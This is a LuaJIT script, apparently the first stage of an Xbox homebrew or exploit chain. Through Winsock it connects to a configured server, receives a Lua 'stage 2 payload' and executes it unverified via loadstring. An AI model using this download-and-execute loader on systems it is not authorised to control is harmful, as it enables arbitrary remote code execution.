local ffi = require("ffi")

--  EDIT ME
local testWindows = false -- Set for testing script on windows
local serverIp = "192.168.123.1" -- Change this to your server's IP address
local serverPort = 8123 -- Change this to your server's port
-- EDIT END

-- Override for local windows testing
if testWindows then
    print("Platform: Windows")
    serverIp = "127.0.0.1"
else
    print("Platform: XBOX")
end

ffi.cdef[[
    typedef char CHAR;
    typedef int INT;
    typedef short SHORT;
    typedef unsigned short WORD;
    typedef unsigned int DWORD;
    typedef unsigned long* ULONG_PTR;
    typedef void* PVOID;
]]

-- Define necessary WS2_32 structures
ffi.cdef[[
struct in_addr {
    unsigned long s_addr;
};

struct sockaddr_in {
    unsigned short sin_family;
    unsigned short sin_port;
    struct in_addr sin_addr;
    unsigned char sin_zero[8];
};

typedef struct sockaddr_in SOCKADDR_IN;
typedef struct in_addr IN_ADDR;

/*
#define AF_INET 0x02
#define SOCK_STREAM 0x01
#define IPPROTO_TCP 0x06
*/
]]

ffi.cdef[[
    typedef struct PROTOCOL_INFOA {
        DWORD pi_protocol;
        DWORD pi_protocol_type;
        DWORD pi_protocol_version;
        DWORD pi_protocol_min_ifspeed;
        DWORD pi_protocol_max_ifspeed;
        DWORD pi_protocol_flags;
    } PROTOCOL_INFOA;
    
    typedef struct WSADATA {
        WORD wVersion;
        WORD wHighVersion;
        DWORD dwID;
        DWORD dwFlags;
        SHORT wMaxProtocolVersion;
        INT nDescrLength;
        CHAR szDescription[128];
        CHAR szName[128];
        CHAR lpszVendorInfo[128];
    } WSADATA;
    
    typedef PROTOCOL_INFOA* LPWSAPROTOCOL_INFOA;
    typedef WSADATA* LPWSADATA;
]]

-- Define necessary WS2_32 function prototypes
ffi.cdef[[
int connect(int sockfd, const struct sockaddr_in *addr, int addrlen);
int send(int sockfd, const char *buf, int len, int flags);
int recv(int sockfd, char *buf, int len, int flags);
int closesocket(int sockfd);
int WSAGetLastError(void);
void WSACleanup(void);
int WSAStartup(unsigned short wVersionRequested, LPWSADATA lpwsaData);
int WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA g, int own, int flags);
int gethostbyname(char* name, char** addr, int* addrlen);
unsigned int inet_addr(const char* cp);
int htons(short value);
]]

local ws2_32 = ffi.load("ws2_32")


membuf = {
    size = 0,
    actualSize = nil,
    buffer = nil,
}

function membuf.create(size)
    local self = {
        buffer =  ffi.new("char[?]", size),
        size = size,
        actualSize = nil,
    }
    return self
end

function chainloadLua(sock)
    local bufsize = 8192 -- 8kb
    local buf = membuf.create(bufsize)
    
    local received = ""
    
    while true do
        local res = ws2_32.recv(sock, buf.buffer, bufsize, 0)
        if res > 0 then
            print("Bytes received: "..res)
            local luastr = ffi.string(buf.buffer, res)
            received = received .. luastr
        elseif res == 0 then
            print("Connection closed")
            return received
        else
            print("recv failed, err: "..ws2_32.WSAGetLastError())
            return
        end
    end
end

function initWinsock2()
    local wsadata = ffi.new("WSADATA")
    return ws2_32.WSAStartup(0x101, wsadata)
end

function cleanupWinsock2()
    ws2_32.WSACleanup()
end

function openTcpConnection(ipAddress, port)
    -- Create a socket
    local sock = ws2_32.WSASocketA(2, 1, 6, nil, 0, 0)

    -- Connect to the server
    local addr = ffi.new("SOCKADDR_IN", {
        sin_family = 2,
        sin_port = ws2_32.htons(port), -- Correctly convert server_port to network byte order
        sin_addr = ffi.new("IN_ADDR") -- Initialize IN_ADDR structure
    })
    addr.sin_addr.s_addr = ws2_32.inet_addr(ipAddress) -- Assign the converted IP address to s_addr
    local conn = ws2_32.connect(sock, addr, ffi.sizeof(addr))
    if conn == -1 then
        print("Connection failed:", ffi.errno())
    else
        print("Connected successfully!")
    end

    return sock
end

function socketRecv(sock, buf, buflen, flags)
    return ws2_32.recv(sock, buf, buflen, flags)
end

function socketSend(sock, buf, buflen, flags)
    return ws2_32.send(sock, buf, buflen, flags);
end

function closeSocket(sock)
    ws2_32.closesocket(sock)
end

function wsaGetLastError()
    return ws2_32.WSAGetLastError()
end

-- Initialize Winsock
if initWinsock2() ~= 0 then
    print("Failed to initialize Winsock")
    return
end

-- Open socket to Host
local sock = openTcpConnection(serverIp, serverPort)

-- Chainload stage 2 payload
local chainloadCallable = nil
if testWindows == true then
    chainloadCallable = loadfile("stage2.lua")
else
    local luaScript = chainloadLua(sock)
    if luaScript ~= nil then
      chainloadCallable = loadstring(luaScript)
    end
end

if chainloadCallable ~= nil then
    print("Chainloading...")
    chainloadCallable()
  end

--------------------------------------

-- Close the socket
closeSocket(sock)

-- Cleanup Winsock
cleanupWinsock2()

